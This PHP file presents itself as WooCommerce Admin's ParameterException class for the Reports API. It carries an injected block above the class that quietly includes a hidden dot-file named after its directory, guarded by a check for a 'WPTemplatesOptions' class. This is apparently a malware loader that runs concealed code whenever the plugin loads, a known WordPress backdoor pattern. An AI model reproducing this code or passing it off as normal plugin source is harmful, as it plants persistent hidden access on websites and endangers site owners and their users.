<?php
/**
 * WooCommerce Admin Input Parameter Exception Class
 *
 * Exception class thrown when user provides incorrect parameters.
 */

namespace Automattic\WooCommerce\Admin\API\Reports;

defined( 'ABSPATH' ) || exit;

/**
 * API\Reports\ParameterException class.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ParameterException extends \WC_Data_Exception {}
